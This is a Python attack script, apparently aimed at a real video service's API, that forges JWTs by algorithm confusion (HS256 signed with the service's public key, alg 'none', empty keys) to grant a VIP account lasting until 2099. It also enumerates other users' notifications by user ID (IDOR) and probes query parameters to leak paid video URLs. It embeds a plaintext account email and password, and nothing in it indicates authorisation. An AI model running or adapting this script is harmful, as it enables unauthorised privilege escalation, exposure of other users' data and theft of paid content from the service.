# -*- coding: utf-8 -*-
"""攻击包 v2 mode 版: jwt / idor / proj 分模式(窗口内专注)"""

import urllib.request, urllib.parse, json, time, sys, ssl, base64, hmac, hashlib

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
mode = sys.argv[2] if len(sys.argv) > 2 else "jwt"
res = []


def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def make_jwt(alg, payload, key=None):
    h = {"alg": alg, "typ": "JWT"}
    p1 = b64u(json.dumps(h, separators=(",", ":")).encode())
    p2 = b64u(json.dumps(payload, separators=(",", ":")).encode())
    if alg == "none":
        return p1 + "." + p2 + "."
    if key:
        sig = hmac.new(key.encode(), (p1 + "." + p2).encode(), hashlib.sha256).digest()
        return p1 + "." + p2 + "." + b64u(sig)
    return p1 + "." + p2 + ".x"


PUB_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsoA9UZOV8b0G/kntXw8WKZpH2rp0KQIEoSmM8IMmOcYhvGjlEvSKs+30+XxUDP+7TIvIP/grz/ORQMHVhVM9EmVLR+GK/PawUXLjdYykSNI4D7Ce0/aW29DF1jVBGBCoe/jpV+3rwXN4eM6ScMaQT9+cQB4hN2VQn4Zcwkd8lw9UZKxdiuF2rbCmasG9s5/p5mtAbYDsq7s1D4WP9VwWhoRKVebuiVuXoF0wps8XeMTxmX8uLLqR8TGLzPvHWkyhAnwixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
PUB_PEM = "-----BEGIN PUBLIC KEY-----\n" + PUB_B64 + "\n-----END PUBLIC KEY-----"
PUB_DER = base64.b64decode(PUB_B64)

vip_payload = {
    "sub": 686285,
    "role": "user",
    "vip_id": 4,
    "vip_level": 4,
    "svip": 1,
    "expiry_at": "2099-01-01 00:00:00",
    "is_downloaded": True,
}

if mode == "jwt":
    log("=== JWT 算法混淆 ===")
    tokens = [
        ("pem", make_jwt("HS256", vip_payload, PUB_PEM)),
        ("b64", make_jwt("HS256", vip_payload, PUB_B64)),
        ("der", make_jwt("HS256", vip_payload, PUB_DER.decode("latin1"))),
        ("b64x2", make_jwt("HS256", vip_payload, PUB_B64 + PUB_B64)),
        ("none", make_jwt("none", vip_payload)),
        (
            "rs256-raw",
            b64u(b'{"alg":"RS256","typ":"JWT"}')
            + "."
            + b64u(json.dumps(vip_payload).encode())
            + ".x",
        ),
        ("hmac-empty", make_jwt("HS256", vip_payload, "")),
        ("hmac-space", make_jwt("HS256", vip_payload, " ")),
        (
            "hmac-jwk",
            make_jwt("HS256", vip_payload, '{"kty":"RSA","n":"' + PUB_B64[:50] + '"}'),
        ),
        ("normal-valid", None),
    ]
    for name, t in tokens:
        if t is None:
            # 用真实 token 对照
            st, body = req(
                "POST",
                "/api/user/login",
                {"email": "3124323585@qq.com", "password": "9876543210."},
            )
            if st == 200:
                tok = (json.loads(body).get("access_token") or "").replace(
                    "bearer ", ""
                )
                st2, b = req(
                    "GET",
                    "/api/user/loi/online_play_v2/6422",
                    headers={"Authorization": "Bearer " + tok},
                )
                res.append({"t": "jwt-" + name, "s": st2, "b": b[:200]})
                log("jwt %s(真实): %s %s" % (name, st2, b[:100]))
            continue
        st, b = req(
            "GET",
            "/api/user/loi/online_play_v2/6422",
            headers={"Authorization": "Bearer " + t},
        )
        res.append({"t": "jwt-" + name, "s": st, "b": b[:200]})
        log("jwt %s: %s %s" % (name, st, b[:100].replace("\n", " ")))
        if st == 200 and "60001" not in b:
            log(">>>>>>> 突破!!! %s" % b[:400])
        time.sleep(0.5)

elif mode == "idor":
    log("=== IDOR/通知 ===")
    st, body = req(
        "POST",
        "/api/user/login",
        {"email": "3124323585@qq.com", "password": "9876543210."},
    )
    tok = ""
    if st == 200:
        tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
    H = {"Authorization": "Bearer " + tok}
    time.sleep(1)
    for uid in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]:
        st, b = req("GET", "/api/user/notifications?user_id=%d" % uid, headers=H)
        res.append({"t": "notif-%d" % uid, "s": st, "b": b[:400]})
        log("notif uid=%d: %s %s" % (uid, st, b[:150].replace("\n", " ")))
        time.sleep(0.5)

elif mode == "proj":
    log("=== 字段投影 ===")
    st, body = req(
        "POST",
        "/api/user/login",
        {"email": "3124323585@qq.com", "password": "9876543210."},
    )
    tok = ""
    if st == 200:
        tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
    H = {"Authorization": "Bearer " + tok}
    time.sleep(1)
    paths = [
        "/api/lois/6422?include=video",
        "/api/lois/6422?with=video",
        "/api/lois/6422?fields=video,images",
        "/api/lois/6422?expand=video",
        "/api/lois/6422?embed=video",
        "/api/lois/6422?select=*",
        "/api/lois/6422?include[]=video",
        "/api/lois/6422?extra=video",
        "/api/lois/6422?full=1",
        "/api/lois/6422?deep=1",
        "/api/lois?page=1&include=video",
        "/api/lois?page=1&with=video_url",
    ]
    for path in paths:
        st, b = req("GET", path, headers=H)
        got = "video" in b.lower() and "60001" not in b and "video_count" not in b
        res.append({"t": "proj-" + path[:45], "s": st, "b": b[:300]})
        log(
            "proj %s: %s %s%s"
            % (path[:50], st, b[:100].replace("\n", " "), " <<<VIDEO!" if got else "")
        )
        time.sleep(0.5)

with open("sqli2_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("sqli2_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("v2 %s shard%d done" % (mode, shard))
